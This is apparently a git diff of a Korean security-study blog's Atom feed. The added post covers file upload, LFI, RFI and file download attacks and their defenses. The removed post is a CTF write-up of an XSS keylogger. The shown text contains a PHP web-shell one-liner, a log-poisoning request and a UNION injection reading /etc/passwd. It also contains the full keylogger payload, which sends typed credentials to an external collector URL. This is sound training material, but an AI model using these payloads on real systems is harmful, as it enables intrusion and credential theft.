@@ -1,4 +1,176 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-08T15:45:42+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹 서버 개발 (17) 마이페이지</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80/" rel="alternate" type="text/html" title="웹 서버 개발 (17) 마이페이지" /><published>2023-06-08T00:00:00+09:00</published><updated>2023-06-08T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80/"><![CDATA[<h2 id="마이페이지">마이페이지</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-09T22:58:17+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IO2OmOydtOyngCDsmpTssq1cbuyEnOuyhCAtPj4g7ISc67KEIDogaW5jbHVkZSDrkJwg66qo65OgIO2OmOydtOyngOulvCDrtojrn6zsmKTquLBcbuyEnOuyhCAtPj4g7ISc67KEIDog7Y6Y7J207KeAIOyLpO2WiSAoIOq3uOumrOq4sCApXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyZhOyEsSDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">File Upload, LFI, RFI, File Download 공격 정리</title><link href="http://localhost:4000/FileUploadLFIRFIFileDownload/" rel="alternate" type="text/html" title="File Upload, LFI, RFI, File Download 공격 정리" /><published>2023-06-09T00:00:00+09:00</published><updated>2023-06-09T23:13:00+09:00</updated><id>http://localhost:4000/FileUploadLFIRFIFileDownload</id><content type="html" xml:base="http://localhost:4000/FileUploadLFIRFIFileDownload/"><![CDATA[<h2 id="file-upload">File Upload</h2>
+
+<h3 id="file-upload-공격-이란">File Upload 공격 이란?</h3>
+<ul>
+  <li>공격자가 임의의 파일을 업로드하는 공격이다.</li>
+  <li>서버 측에서 실행 가능한 파일 올리기 공격이다.</li>
+</ul>
+
+<h3 id="취약점-발생-이유">취약점 발생 이유</h3>
+<ul>
+  <li>업로드 되는 파일을 검증하지 않아서 발생하는 취약점이다.</li>
+</ul>
+
+<h3 id="공격-시나리오">공격 시나리오</h3>
+<ul>
+  <li><strong>웹 쉘 업로드</strong>. 파일 업로드 위치와 업로드한 파일을 실행할 수 있는지 알아야 한다.</li>
+  <li><strong>디페이스 공격</strong>. index.html 파일을 업로드하여 메인페이지를 바꾸는 공격이다.</li>
+  <li>페이지 변조 및 피싱 공격.</li>
+  <li>악성코드 유포 ( 페이지에 XSS 넣기 )</li>
+</ul>
+
+<h3 id="대응-방법">대응 방법</h3>
+<ol>
+  <li>업로드 되는 파일을 DB 테이블에 저장하기. 즉 binary로 저장하기. ( CLOB or BLOB )</li>
+  <li>파일 업로드 서버를 따로 두기. 즉 파일 업로드 서버에는 웹 서버 엔진( jsp, php 등 )이 설치되어 있으면 안된다.</li>
+  <li>파일 검증하기. 확장자 검증, 파일 시그니쳐 검증, MIME TYPE 검증 ( Content-Type 검증 ).</li>
+</ol>
+
+<h2 id="lfi--local-file-inclusion-">LFI ( Local File Inclusion )</h2>
+<ul>
+  <li>웹 서버에서 사용하는  <code class="language-plaintext highlighter-rouge">include</code> 기능을 이용한 취약점이다.</li>
+  <li>서버가 사용자로 부터 파일이름(include 할 파일)을 입력으로 받을 때 발생한다.</li>
+  <li>파일 업로드 취약점의 자매품이다.</li>
+  <li>파일 업로드 보다 상위 공격에 속한다.</li>
+</ul>
+
+<h3 id="include-동작-과정">Include 동작 과정</h3>
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IO2OmOydtOyngCDsmpTssq1cbuyEnOuyhCAtPj4g7ISc67KEIDogaW5jbHVkZSDrkJwg66qo65OgIO2OmOydtOyngOulvCDrtojrn6zsmKTquLBcbuyEnOuyhCAtPj4g7ISc67KEIDog7Y6Y7J207KeAIOyLpO2WiSAoIOq3uOumrOq4sCApXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyZhOyEsSDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
+
+<h3 id="공격-유형">공격 유형</h3>
+
+<h4 id="이미지-웹-쉘">이미지 웹 쉘</h4>
+<ul>
+  <li>이미지 파일에 웹 쉘을 추가하는 공격이다. 즉 확장자는 바뀔 필요가 없다.</li>
+  <li>이미지 파일 자체를 바로 실행하는 것은 불가능 하다.</li>
+</ul>
+
+<h5 id="이미지-웹-쉘-실행-방법">이미지 웹 쉘 실행 방법</h5>
+<ol>
+  <li>.htaccess 서버 설정파일 바꾸기.</li>
+  <li>LFI 취약점 이용하기.</li>
+</ol>
+
+<h5 id="lfi-취약점-이용하기">LFI 취약점 이용하기.</h5>
+
+<ul>
+  <li>정상적인 페이지 요청.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=test.php
+</code></pre></div></div>
+
+<ul>
+  <li>이미지 파일 맨 뒤에 웹 쉘 넣기.</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>웹 쉘이 들어있는 이미지 경로를 적어준다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=이미지 경로/이미지.png
+</code></pre></div></div>
+
+<ul>
+  <li>php 파일의 include에서 이미지 파일을 읽어온 다음 php 파일를 실행시켜 페이지를 완성시킨다.  이때 공격자의 웹쉘이 실행되는 공격법이다.</li>
+</ul>
+
+<h4 id="access-log-파일-이용하기">Access Log 파일 이용하기</h4>
+<ul>
+  <li>이 취약점을 이용하면 파일 업로드를 할 필요도 없다.</li>
+  <li>공격자가 일부러 잘못된 요청을 보내어 오류를 로그에 기록하는 공격기법이다.</li>
+  <li>잘못된 요청<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b803bb0b-532b-40f8-a64e-fe7b4622beda" alt="Pasted image 20230609215043" /></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET &lt;?php echo system($_GET['cmd']); ?&gt; HTTP/1.1
+Host: 221.27.0.6
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>access.log 파일<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a90447c3-63d8-4c4f-addd-f69dc9fd2843" alt="Pasted image 20230609215006" /></p>
+  </li>
+  <li>
+    <p>LFI 취약점이 존재하는 페이지를 찾아 요청에 access.log 파일 경로를 넣어주면 된다.</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=로그파일 위치/access.log
+</code></pre></div></div>
+
+<h2 id="rfi--remote-file-inclusion-">RFI ( Remote File Inclusion )</h2>
+<ul>
+  <li>외부에서 파일을 가지고오는 공격이다.</li>
+  <li>내부의 파일을 불러오는 것이아닌 외부의 파일을 불러와 페이지를 완성시킨다.</li>
+  <li>
+    <p>LFI 보다 공격하기 쉽다.</p>
+  </li>
+  <li>정상적 요청</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=www.gg.rr/file.php
+</code></pre></div></div>
+
+<ul>
+  <li>비정상적 요청</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=공격자가 만든 웹쉥 php
+</code></pre></div></div>
+
+<h2 id="file-download-공격">File Download 공격</h2>
+
+<h3 id="file-download-공격이란">File Download 공격이란?</h3>
+<ul>
+  <li>공격자가 원하는 임의의 파일을 다운로드 할 수 있는 공격이다.</li>
+  <li>소스코드 정보를 탈취할 수 있다. 따라서 소스코드에 적힌 DB 계정 정보를 탈취할 수 있다.</li>
+</ul>
+
+<h3 id="file-download-유형">File Download 유형</h3>
+
+<h4 id="링크를-통한-다운로드">링크를 통한 다운로드</h4>
+<ul>
+  <li>인가 취약점이 존재할 수 있다. 즉 허락받지 않은 사용자가 파일을 다운받을 수 있다.</li>
+  <li>하지만 File Download 공격이 원천적으로 불가능 하다. 왜냐하면 url 경로를 통해 파일을 다운받기 때문이다.</li>
+</ul>
+
+<h4 id="다운로드-스크립트가-존재하는-경우">다운로드 스크립트가 존재하는 경우</h4>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">download.php?file=test.jpg</code> 로 파일을 다운받을 경우이다. <code class="language-plaintext highlighter-rouge">download.php</code> 스크립트가 존재한다.</li>
+  <li>File Download 취약점이 존재할 수 있다.</li>
+</ul>
+
+<h3 id="file-download-취약점-찾기">File Download 취약점 찾기</h3>
+<ol>
+  <li>다운로드 스크립트가 존재하는지 확인한다. 스크립트가 없다면 다운로드 취약점은 존재하지 않는다.</li>
+  <li>파라미터로 파일 이름을 받는지 아니면 파일 경로를 받는지 확인한다.</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download.php?idx=2 =&gt; 취약점 없다 (db 에 저장하는 것 같다)
+
+여기서 sqli 취약점이 존재하면 다운로드 취약점이 존재할 수 있다.
+</code></pre></div></div>
+
+<ul>
+  <li>sqli 취약점 이용하기. 서버에 저장된 파일 경로를 db 테이블에 저장하는 경우가 해당된다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">path</span> <span class="k">from</span> <span class="n">board</span> <span class="k">where</span> <span class="n">idx</span><span class="o">=</span><span class="p">{}</span> 
+
+<span class="o">?</span><span class="n">idx</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="s1">'/etc/passwd'</span>
+
+<span class="n">sqli</span> <span class="err">취약점을</span> <span class="err">이용하여</span> <span class="err">원하는</span> <span class="err">파일을</span> <span class="err">다운로드</span> <span class="err">한다</span><span class="p">.</span>
+</code></pre></div></div>
+
+<h3 id="대응-방법-1">대응 방법</h3>
+<ol>
+  <li>파일을 DB 테이블에 저장하기.</li>
+  <li>파일 저장 위치를 물리적으로 분리시키기. ( NAS )</li>
+  <li>디렉토리 traversal 막기. (  <code class="language-plaintext highlighter-rouge">../</code> 경로 이동 막기 )</li>
+</ol>]]></content><author><name>Jung MinGyu</name></author><category term="file upload" /><category term="file download" /><category term="lfi" /><category term="rfi" /><summary type="html"><![CDATA[File Upload, LFI, RFI, File Download 공격에 대하여 알아보자.]]></summary></entry><entry><title type="html">웹 서버 개발 (17) 마이페이지</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80/" rel="alternate" type="text/html" title="웹 서버 개발 (17) 마이페이지" /><published>2023-06-08T00:00:00+09:00</published><updated>2023-06-08T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C17%EB%A7%88%EC%9D%B4%ED%8E%98%EC%9D%B4%EC%A7%80/"><![CDATA[<h2 id="마이페이지">마이페이지</h2>
 <ul>
   <li>사용자 정보 확인 기능.</li>
   <li>사용자 정보 변경 기능.</li>
@@ -2435,106 +2607,4 @@ jsp &gt; .jspx ( .jsp 와 문법이 다르다. )
 
 <ul>
   <li>요청을 문자 그대로 인식하여 XSS를 예방한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/60d0a792-8519-4680-ae8a-ebcc4fe1fe6b" alt="Pasted image 20230530212323" /></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><category term="java" /><summary type="html"><![CDATA[로그인 페이지 Reflected XSS 취약점 발견하였다.]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
-<ul>
-  <li>크라이언트 측 스크립트를 삽입하는 공격이다.</li>
-</ul>
-
-<h2 id="xss-7번-문제">XSS 7번 문제</h2>
-<ul>
-  <li>키로거를 삽입하여 사용자의 계정을 탈취하는 문제이다.</li>
-</ul>
-
-<h2 id="사이트-분석-및-취약점-탐색">사이트 분석 및 취약점 탐색</h2>
-
-<h3 id="로그인">로그인</h3>
-<ul>
-  <li>POST 와 GET 두 방식으로 로그인이 가능하다.</li>
-</ul>
-
-<h3 id="로그인-실패-페이지">로그인 실패 페이지</h3>
-<ul>
-  <li>XSS 취약점이 존재한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7654383c-c4bd-441c-aef4-5b3de1abd353" alt="Pasted image 20230529012624" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8efcad7-ebd2-45f6-8532-6d6a18772543" alt="Pasted image 20230529012643" /></li>
-  <li>아이디 대신 스크립문을 삽입할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/bc4ab412-10ca-453e-8aca-15254576ec26" alt="Pasted image 20230529013321" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13cd15a9-8863-4135-9098-c5611767d780" alt="Pasted image 20230529013241" /></li>
-</ul>
-
-<h2 id="공격-시나리오">공격 시나리오</h2>
-<ol>
-  <li>login.html 에서 사용자가 로그인을 시도하는 것이 아닌 login.php에서 사용자가 로그인을 시도하도록 하자.</li>
-  <li>login.php의 XSS 취약점을 이용하여 키로그를 삽입한다.</li>
-  <li>사용자에게 공격자가 준 링크를 통해 페이지에 방문하여 로그인 하도록 해야한다.</li>
-</ol>
-
-<h2 id="공격-시작">공격 시작</h2>
-<ol>
-  <li>alert 창 안뜨게 만들기. 첫번째 스크립트는 일부러 오류를 유발시켜 동작안되도록 하였다. 따라서 <code class="language-plaintext highlighter-rouge">alert(1)</code> 이 경고창으로 뜨는 것을 확인할 수 있다.
-    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
-<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">// ] ~~~');</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">login.html</span><span class="dl">'</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
-</code></pre></div>    </div>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);//
-</code></pre></div>    </div>
-    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/343cd063-2ed6-4cc2-8611-ead3b5e960b3" alt="Pasted image 20230529015248" /></p>
-  </li>
-  <li><code class="language-plaintext highlighter-rouge">href</code> 를 통해 자동으로 리다이렉트 형상 막기. html 주석 처리 기능을 이용하여 <code class="language-plaintext highlighter-rouge">href</code> 스크립트 부부을 주석처리 해준다. 확인 버튼을 눌러도 <code class="language-plaintext highlighter-rouge">login.html</code> 로 리다이렉션하지 않고 <code class="language-plaintext highlighter-rouge">login.php</code> 에 머문다.
-    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
-<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-<span class="nt">&lt;/script&gt;</span><span class="c">&lt;!--// ] ~~~');
-&lt;/script&gt;
-&lt;script&gt;window.location.href='login.html';&lt;/script&gt;
-</span></code></pre></div>    </div>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--//
-</code></pre></div>    </div>
-    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/869eb7fb-9a97-44c7-801c-7b6686f08df2" alt="Pasted image 20230529020238" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d92d7de7-328b-4ba7-a497-1d1465e2f677" alt="Pasted image 20230529020302" /></p>
-  </li>
-  <li>사용자는 정상적인 로그인 페이지가 보여야한다. 따라서 <code class="language-plaintext highlighter-rouge">iframe</code> 을 통해 로그인 창 보이게 한다. 공격문을 id에 넣고 로그인을 하면 <code class="language-plaintext highlighter-rouge">login.php</code> 에서 로그인 페이지가 나오는 것을 확인할 수 있다.
-<script src="https://gist.github.com/MinGyu2/e2b89c91fab5b1368f8bc58efd245e22.js"></script>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 =
-id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html'&gt;&lt;/iframe&gt;&lt;!--//
-</code></pre></div>    </div>
-    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5e9676ba-637a-4b09-8913-16a4e8f78c7d" alt="Pasted image 20230529022346" /></p>
-  </li>
-  <li>사용자가 입력하는 아이디와 비번을 알아내기위한 키로거를 넣어보자. 그리고 키로거를 이용하여 사용자 입력을 200ms 주기로 콘솔에 출력해보자.
-<script src="https://gist.github.com/MinGyu2/c2557af1a361f188bfc86138b17b17d0.js"></script><br /><script src="https://gist.github.com/MinGyu2/d0cd73f4feb2e940ea44d7d8b5cbae57.js"></script>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
-id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){console.log(keys);keys='';}}, 200);&lt;/script&gt;&lt;!--//
-</code></pre></div>    </div>
-    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f83fc784-7b5c-4f08-bf73-10774b39ad7c" alt="Pasted image 20230529030914" /><br />
-<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a58cfab3-8e93-481b-8246-efcd720ff3d9" alt="Pasted image 20230529030931" /></p>
-  </li>
-  <li>공격자 서버로 사용자 입력 보내기. 사용자의 입력을 <code class="language-plaintext highlighter-rouge">Image</code> 를 이용하여 공격자 서버로 보낸다.
-<script src="https://gist.github.com/MinGyu2/66fcfc1763b5cb43c951ba7c39a6cc33.js"></script>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
-id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://envs1y92en6c.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
-</code></pre></div>    </div>
-    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d451186b-0c43-4949-9dae-dad6b2bb8617" alt="Pasted image 20230529035800" />
-<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/816c929e-21b6-4a90-92c9-0ad7a4c7aad0" alt="Pasted image 20230529040046" />
-<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/be7c8f83-620d-4cfa-9227-a3b70eef1dd8" alt="Pasted image 20230529035816" /></p>
-  </li>
-  <li>로그인에 성공하면 실제 메인 페이지를 보여줘야 의심이 안간다. 즉 로그인에 실패하면 iframe 내에서 로그인을 다시 시도해야하고, 성공하면 정상적으로 로그인 성공한 것으로 보이기위하여 <code class="language-plaintext highlighter-rouge">index.php</code>로 이동한다.<br /><script src="https://gist.github.com/MinGyu2/81cbf0b824103cc9bc0c0c1f5a52b64f.js"></script>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
-id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://enhrvcr5t8jsk.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;var s = win.location.href;if(s!='http://ctf.segfaulthub.com:4343/xss_7/login.html'){location.href="index.php";new Image().src = hackURL+"success";}else{new Image().src = hackURL+"fail";}win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
-</code></pre></div>    </div>
-    <ul>
-      <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/596bb9cf-ad96-4863-acc8-d76a3188bfa5" alt="Pasted image 20230529042336" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e874aec8-af9e-48d5-b053-49bd57473b6b" alt="Pasted image 20230529042328" /></li>
-      <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/917e710b-4fba-491c-8e49-4a4db21c3fee" alt="Pasted image 20230529042229" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/308c8ff8-386d-4547-a168-940215b06ce7" alt="Pasted image 20230529042237" /></li>
-    </ul>
-  </li>
-  <li>로그인을 GET요청으로 할 수 있음으로 Reflected XSS 취약점으로 활용할 수있다. 따라서 Get요청으로 공격하기 위해서 id 파라미터에 공격 스크립트를 넣어 링크를 눌러 사용자가 접속하여 로그인 하도록 유도 하면 된다.
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:4343/xss_7/login.php?id=id%27%3C%2Fscript%3E%3Ciframe+style%3D%22position%3Aabsolute%3Bborder%3Anone%3Boverflow%3Ahidden%3Boverflow-x%3Ahidden%3Boverflow-y%3Ahidden%3Bheight%3A100%25%3Bwidth%3A100%25%3Btop%3A0px%3Bleft%3A0px%3Bright%3A0px%3Bbottom%3A0px%22+src%3D%27login.html%27+onload%3D%27load%28%29%27%3E%3C%2Fiframe%3E%3Cscript%3Evar+keys+%3D+%22%22%3Bvar+hackURL+%3D+%22https%3A%2F%2Fenhrvcr5t8jsk.x.pipedream.net%2F%3Fv%3D%22%3Bfunction+load%28%29%7Bvar+win+%3D+document.getElementsByTagName%28%27iframe%27%29%5B0%5D.contentWindow%3Bvar+s+%3D+win.location.href%3Bif%28s%21%3D%27http%3A%2F%2Fctf.segfaulthub.com%3A4343%2Fxss_7%2Flogin.html%27%29%7Blocation.href%3D%22index.php%22%3Bnew+Image%28%29.src+%3D+hackURL%2B%22success%22%3B%7Delse%7Bnew+Image%28%29.src+%3D+hackURL%2B%22fail%22%3B%7Dwin.onkeydown%3D%28e%29%3D%3E%7Bkey+%3D+e.keyCode%3Fe.keyCode%3Ae.charCode%3Bkey+%3D+String.fromCharCode%28key%29%3Bkeys+%2B%3D+key%3B%7D%7Dwindow.setInterval%28function%28%29%7Bif%28keys+%21%3D+%27%27%29%7Bnew+Image%28%29.src+%3D+hackURL%2Bkeys%3Bkeys%3D%27%27%3B%7D%7D%2C+1000%29%3B%3C%2Fscript%3E%3C%21--%2F%2F&amp;pw=123
-</code></pre></div>    </div>
-  </li>
-  <li>사용자가 로그인 창에 아이디와 비밀번호를 입력하면 공격자 서버로 아이디와 비밀번호가 전송된다. <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aecb22ef-f21a-4517-9ec9-3fb4f6d57a1e" alt="Pasted image 20230529042638" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a2ddcfb2-659d-4efb-8db6-9cf70beb8ff7" alt="Pasted image 20230529042652" /></li>
-</ol>
-
-<h2 id="후기">후기</h2>
-<ul>
